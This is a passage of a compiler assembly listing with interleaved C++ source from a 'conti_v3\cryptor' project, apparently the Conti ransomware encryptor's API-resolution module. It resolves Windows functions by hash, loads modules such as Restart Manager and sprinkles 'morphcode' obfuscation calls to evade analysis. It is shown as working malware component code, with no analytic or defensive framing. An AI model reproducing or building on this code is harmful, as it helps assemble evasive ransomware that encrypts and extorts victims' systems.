; 588  : 
; 589  : 			return (LPVOID)ProcAddress;

  0024a	48 8b 45 28	 mov	 rax, QWORD PTR ProcAddress$[rbp]
  0024e	e9 5f 01 00 00	 jmp	 $LN1@GetProcAdd
$LN6@GetProcAdd:

; 590  : 
; 591  : 		}
; 592  : 
; 593  : 		return (LPVOID)0;

  00253	33 c0		 xor	 eax, eax
  00255	e9 58 01 00 00	 jmp	 $LN1@GetProcAdd

; 594  : 
; 595  : 	}

  0025a	e9 51 01 00 00	 jmp	 $LN5@GetProcAdd
$LN4@GetProcAdd:

; 596  : 	else
; 597  : 	{
; 598  : 
; 599  : 		switch (ModuleId)

  0025f	8b 85 a8 05 00
	00		 mov	 eax, DWORD PTR ModuleId$[rbp]
  00265	89 85 74 05 00
	00		 mov	 DWORD PTR tv167[rbp], eax
  0026b	8b 85 74 05 00
	00		 mov	 eax, DWORD PTR tv167[rbp]
  00271	83 e8 0f	 sub	 eax, 15
  00274	89 85 74 05 00
	00		 mov	 DWORD PTR tv167[rbp], eax
  0027a	83 bd 74 05 00
	00 0b		 cmp	 DWORD PTR tv167[rbp], 11
  00281	0f 87 df 00 00
	00		 ja	 $LN19@GetProcAdd
  00287	8b 85 74 05 00
	00		 mov	 eax, DWORD PTR tv167[rbp]
  0028d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__ImageBase
  00294	8b 84 81 00 00
	00 00		 mov	 eax, DWORD PTR $LN22@GetProcAdd[rcx+rax*4]
  0029b	48 03 c1	 add	 rax, rcx
  0029e	ff e0		 jmp	 rax
$LN7@GetProcAdd:

; 600  : 		{
; 601  : 
; 602  : 		case KERNEL32_MODULE_ID:
; 603  : 			ModuleName = Kernel32DLL;

  002a0	48 8b 45 68	 mov	 rax, QWORD PTR Kernel32DLL$[rbp]
  002a4	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 604  : 			break;

  002ab	e9 ba 00 00 00	 jmp	 $LN2@GetProcAdd
$LN8@GetProcAdd:

; 605  : 
; 606  : 		case ADVAPI32_MODULE_ID:
; 607  : 			ModuleName = Advapi32DLL;

  002b0	48 8b 45 48	 mov	 rax, QWORD PTR Advapi32DLL$[rbp]
  002b4	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 608  : 			break;

  002bb	e9 aa 00 00 00	 jmp	 $LN2@GetProcAdd
$LN9@GetProcAdd:

; 609  : 
; 610  : 		case NETAPI32_MODULE_ID:
; 611  : 			ModuleName = Netapi32DLL;

  002c0	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR Netapi32DLL$[rbp]
  002c7	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 612  : 			break;

  002ce	e9 97 00 00 00	 jmp	 $LN2@GetProcAdd
$LN10@GetProcAdd:

; 613  : 
; 614  : 		case IPHLPAPI_MODULE_ID:
; 615  : 			ModuleName = IphlpapiDLL;

  002d3	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR IphlpapiDLL$[rbp]
  002da	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 616  : 			break;

  002e1	e9 84 00 00 00	 jmp	 $LN2@GetProcAdd
$LN11@GetProcAdd:

; 617  : 
; 618  : 		case RSTRTMGR_MODULE_ID:
; 619  : 			ModuleName = RstrtmgrDLL;

  002e6	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR RstrtmgrDLL$[rbp]
  002ed	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 620  : 			break;

  002f4	eb 74		 jmp	 SHORT $LN2@GetProcAdd
$LN12@GetProcAdd:

; 621  : 
; 622  : 		case USER32_MODULE_ID:
; 623  : 			ModuleName = User32DLL;

  002f6	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR User32DLL$[rbp]
  002fd	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 624  : 			break;

  00304	eb 64		 jmp	 SHORT $LN2@GetProcAdd
$LN13@GetProcAdd:

; 625  : 
; 626  : 		case WS2_32_MODULE_ID:
; 627  : 			ModuleName = Ws2_32DLL;

  00306	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR Ws2_32DLL$[rbp]
  0030d	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 628  : 			break;

  00314	eb 54		 jmp	 SHORT $LN2@GetProcAdd
$LN14@GetProcAdd:

; 629  : 
; 630  : 		case SHLWAPI_MODULE_ID:
; 631  : 			ModuleName = ShlwapiDLL;

  00316	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ShlwapiDLL$[rbp]
  0031d	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 632  : 			break;

  00324	eb 44		 jmp	 SHORT $LN2@GetProcAdd
$LN15@GetProcAdd:

; 633  : 
; 634  : 		case SHELL32_MODULE_ID:
; 635  : 			ModuleName = Shell32DLL;

  00326	48 8b 85 48 01
	00 00		 mov	 rax, QWORD PTR Shell32DLL$[rbp]
  0032d	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 636  : 			break;

  00334	eb 34		 jmp	 SHORT $LN2@GetProcAdd
$LN16@GetProcAdd:

; 637  : 
; 638  : 		case OLE32_MODULE_ID:
; 639  : 			ModuleName = Ole32DLL;

  00336	48 8b 85 68 01
	00 00		 mov	 rax, QWORD PTR Ole32DLL$[rbp]
  0033d	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 640  : 			break;

  00344	eb 24		 jmp	 SHORT $LN2@GetProcAdd
$LN17@GetProcAdd:

; 641  : 
; 642  : 		case OLEAUT32_MODULE_ID:
; 643  : 			ModuleName = OleAut32DLL;

  00346	48 8b 85 88 01
	00 00		 mov	 rax, QWORD PTR OleAut32DLL$[rbp]
  0034d	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 644  : 			break;

  00354	eb 14		 jmp	 SHORT $LN2@GetProcAdd
$LN18@GetProcAdd:

; 645  : 
; 646  : 		case NTDLL_MODULE_ID:
; 647  : 			ModuleName = NtdllDLL;

  00356	48 8b 85 a8 01
	00 00		 mov	 rax, QWORD PTR NtdllDLL$[rbp]
  0035d	48 89 85 a0 05
	00 00		 mov	 QWORD PTR ModuleName$[rbp], rax

; 648  : 			break;

  00364	eb 04		 jmp	 SHORT $LN2@GetProcAdd
$LN19@GetProcAdd:

; 649  : 
; 650  : 		default:
; 651  : 			return (LPVOID)0;

  00366	33 c0		 xor	 eax, eax
  00368	eb 48		 jmp	 SHORT $LN1@GetProcAdd
$LN2@GetProcAdd:

; 652  : 
; 653  : 		}
; 654  : 
; 655  : 		hModule = pLoadLibraryA(ModuleName);

  0036a	48 8b 8d a0 05
	00 00		 mov	 rcx, QWORD PTR ModuleName$[rbp]
  00371	ff 15 00 00 00
	00		 call	 QWORD PTR ?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA ; pLoadLibraryA
  00377	48 89 45 08	 mov	 QWORD PTR hModule$[rbp], rax

; 656  : 
; 657  : 		morphcode(hModule);

  0037b	48 8b 4d 08	 mov	 rcx, QWORD PTR hModule$[rbp]
  0037f	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 658  : 
; 659  : 		if (hModule) {

  00384	48 83 7d 08 00	 cmp	 QWORD PTR hModule$[rbp], 0
  00389	74 25		 je	 SHORT $LN20@GetProcAdd

; 660  : 
; 661  : 			ProcAddress = GetApiAddr(hModule, Hash, &ProcAddress);

  0038b	4c 8d 45 28	 lea	 r8, QWORD PTR ProcAddress$[rbp]
  0038f	8b 95 b0 05 00
	00		 mov	 edx, DWORD PTR Hash$[rbp]
  00395	48 8b 4d 08	 mov	 rcx, QWORD PTR hModule$[rbp]
  00399	e8 00 00 00 00	 call	 ?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z ; GetApiAddr
  0039e	48 89 45 28	 mov	 QWORD PTR ProcAddress$[rbp], rax

; 662  : 
; 663  : 			morphcode(ProcAddress);

  003a2	8b 4d 28	 mov	 ecx, DWORD PTR ProcAddress$[rbp]
  003a5	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 664  : 
; 665  : 			return (LPVOID)ProcAddress;

  003aa	48 8b 45 28	 mov	 rax, QWORD PTR ProcAddress$[rbp]
  003ae	eb 02		 jmp	 SHORT $LN1@GetProcAdd
$LN20@GetProcAdd:
$LN5@GetProcAdd:

; 666  : 
; 667  : 		}
; 668  : 
; 669  : 	}
; 670  : 
; 671  : 	return (LPVOID)0;

  003b0	33 c0		 xor	 eax, eax
$LN1@GetProcAdd:

; 672  : }

  003b2	48 8b f8	 mov	 rdi, rax
  003b5	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  003b9	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z$rtcFrameData
  003c0	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  003c5	48 8b c7	 mov	 rax, rdi
  003c8	48 8b 8d 78 05
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  003cf	48 33 cd	 xor	 rcx, rbp
  003d2	e8 00 00 00 00	 call	 __security_check_cookie
  003d7	48 8d a5 88 05
	00 00		 lea	 rsp, QWORD PTR [rbp+1416]
  003de	5f		 pop	 rdi
  003df	5d		 pop	 rbp
  003e0	c3		 ret	 0
  003e1	0f 1f 00	 npad	 3
$LN22@GetProcAdd:
  003e4	00 00 00 00	 DD	 $LN7@GetProcAdd
  003e8	00 00 00 00	 DD	 $LN8@GetProcAdd
  003ec	00 00 00 00	 DD	 $LN9@GetProcAdd
  003f0	00 00 00 00	 DD	 $LN10@GetProcAdd
  003f4	00 00 00 00	 DD	 $LN11@GetProcAdd
  003f8	00 00 00 00	 DD	 $LN12@GetProcAdd
  003fc	00 00 00 00	 DD	 $LN13@GetProcAdd
  00400	00 00 00 00	 DD	 $LN14@GetProcAdd
  00404	00 00 00 00	 DD	 $LN15@GetProcAdd
  00408	00 00 00 00	 DD	 $LN16@GetProcAdd
  0040c	00 00 00 00	 DD	 $LN17@GetProcAdd
  00410	00 00 00 00	 DD	 $LN18@GetProcAdd
?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z ENDP		; getapi::GetProcAddressEx
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?SetRestartManagerLoaded@getapi@@YAXH@Z
_TEXT	SEGMENT
value$ = 224
?SetRestartManagerLoaded@getapi@@YAXH@Z PROC		; getapi::SetRestartManagerLoaded, COMDAT

; 53   : {

$LN3:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 54   : 	g_IsRstrtMgrLoaded = value;

  0001e	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR value$[rbp]
  00024	89 05 00 00 00
	00		 mov	 DWORD PTR ?g_IsRstrtMgrLoaded@@3HA, eax ; g_IsRstrtMgrLoaded

; 55   : }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?SetRestartManagerLoaded@getapi@@YAXH@Z ENDP		; getapi::SetRestartManagerLoaded
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?IsRestartManagerLoaded@getapi@@YAHXZ
_TEXT	SEGMENT
?IsRestartManagerLoaded@getapi@@YAHXZ PROC		; getapi::IsRestartManagerLoaded, COMDAT

; 47   : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 48   : 	return g_IsRstrtMgrLoaded;

  0001b	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_IsRstrtMgrLoaded@@3HA ; g_IsRstrtMgrLoaded

; 49   : }

  00021	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00028	5f		 pop	 rdi
  00029	5d		 pop	 rbp
  0002a	c3		 ret	 0
?IsRestartManagerLoaded@getapi@@YAHXZ ENDP		; getapi::IsRestartManagerLoaded
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?InitializeGetapiModule@getapi@@YAHXZ
_TEXT	SEGMENT
dwLoadLibraryA$ = 8
__$ArrayPad$ = 216
?InitializeGetapiModule@getapi@@YAHXZ PROC		; getapi::InitializeGetapiModule, COMDAT

; 526  : {

$LN5:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00014	b9 0a 00 00 00	 mov	 ecx, 10
  00019	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0001e	f3 ab		 rep stosd
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c5	 xor	 rax, rbp
  0002a	48 89 85 d8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00038	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 527  : 	g_hKernel32 = GetKernel32();

  0003d	e8 00 00 00 00	 call	 ?GetKernel32@@YAPEAUHINSTANCE__@@XZ ; GetKernel32
  00042	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_hKernel32@@3PEAUHINSTANCE__@@EA, rax ; g_hKernel32

; 528  : 	morphcode(g_hKernel32);

  00049	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_hKernel32@@3PEAUHINSTANCE__@@EA ; g_hKernel32
  00050	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 529  : 
; 530  : 	ADDR dwLoadLibraryA;
; 531  : 	pLoadLibraryA = (fnLoadLibraryA)GetApiAddr(g_hKernel32, LOADLIBRARYA_HASH, &dwLoadLibraryA);

  00055	4c 8d 45 08	 lea	 r8, QWORD PTR dwLoadLibraryA$[rbp]
  00059	ba 33 7e 9c 43	 mov	 edx, 1134329395		; 439c7e33H
  0005e	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_hKernel32@@3PEAUHINSTANCE__@@EA ; g_hKernel32
  00065	e8 00 00 00 00	 call	 ?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z ; GetApiAddr
  0006a	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA, rax ; pLoadLibraryA

; 532  : 
; 533  : 	morphcode(pLoadLibraryA);

  00071	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA ; pLoadLibraryA
  00078	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 534  : 
; 535  : 	if (!pLoadLibraryA) {

  0007d	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?pLoadLibraryA@@3P6APEAUHINSTANCE__@@PEBD@ZEA, 0 ; pLoadLibraryA
  00085	75 04		 jne	 SHORT $LN2@Initialize

; 536  : 		return FALSE;

  00087	33 c0		 xor	 eax, eax
  00089	eb 41		 jmp	 SHORT $LN1@Initialize
$LN2@Initialize:

; 537  : 	}
; 538  : 
; 539  : 	g_ApiCache = (LPVOID*)malloc(API_CACHE_SIZE);

  0008b	b9 00 20 00 00	 mov	 ecx, 8192		; 00002000H
  00090	e8 00 00 00 00	 call	 malloc
  00095	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_ApiCache@@3PEAPEAXEA, rax ; g_ApiCache

; 540  : 
; 541  : 	morphcode(g_ApiCache);

  0009c	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_ApiCache@@3PEAPEAXEA ; g_ApiCache
  000a3	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 542  : 
; 543  : 	if (!g_ApiCache) {

  000a8	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_ApiCache@@3PEAPEAXEA, 0 ; g_ApiCache
  000b0	75 04		 jne	 SHORT $LN3@Initialize

; 544  : 		return FALSE;

  000b2	33 c0		 xor	 eax, eax
  000b4	eb 16		 jmp	 SHORT $LN1@Initialize
$LN3@Initialize:

; 545  : 	}
; 546  : 
; 547  : 	RtlSecureZeroMemory(g_ApiCache, API_CACHE_SIZE);

  000b6	ba 00 20 00 00	 mov	 edx, 8192		; 00002000H
  000bb	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_ApiCache@@3PEAPEAXEA ; g_ApiCache
  000c2	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 548  : 	return TRUE;

  000c7	b8 01 00 00 00	 mov	 eax, 1
$LN1@Initialize:

; 549  : }

  000cc	48 8b f8	 mov	 rdi, rax
  000cf	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000d3	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?InitializeGetapiModule@getapi@@YAHXZ$rtcFrameData
  000da	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000df	48 8b c7	 mov	 rax, rdi
  000e2	48 8b 8d d8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000e9	48 33 cd	 xor	 rcx, rbp
  000ec	e8 00 00 00 00	 call	 __security_check_cookie
  000f1	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  000f8	5f		 pop	 rdi
  000f9	5d		 pop	 rbp
  000fa	c3		 ret	 0
?InitializeGetapiModule@getapi@@YAHXZ ENDP		; getapi::InitializeGetapiModule
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
vptr$ = 8
ptr$ = 256
cnt$ = 264
RtlSecureZeroMemory PROC				; COMDAT

; 21766: {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__FBBA8F9D_winnt@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 21767:     volatile char *vptr = (volatile char *)ptr;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]
  0002b	48 89 45 08	 mov	 QWORD PTR vptr$[rbp], rax

; 21768: 
; 21769: #if defined(_M_AMD64) && !defined(_M_ARM64EC)
; 21770: 
; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0002f	48 8b 7d 08	 mov	 rdi, QWORD PTR vptr$[rbp]
  00033	33 c0		 xor	 eax, eax
  00035	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR cnt$[rbp]
  0003c	f3 aa		 rep stosb

; 21772: 
; 21773: #else
; 21774: 
; 21775:     while (cnt) {
; 21776: 
; 21777: #if !defined(_M_CEE) && (defined(_M_ARM) || defined(_M_ARM64) || defined(_M_ARM64EC))
; 21778: 
; 21779:         __iso_volatile_store8(vptr, 0);
; 21780: 
; 21781: #else
; 21782: 
; 21783:         *vptr = 0;
; 21784: 
; 21785: #endif
; 21786: 
; 21787:         vptr++;
; 21788:         cnt--;
; 21789:     }
; 21790: 
; 21791: #endif // _M_AMD64 && !defined(_M_ARM64EC)
; 21792: 
; 21793:     return ptr;

  0003e	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]

; 21794: }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
END
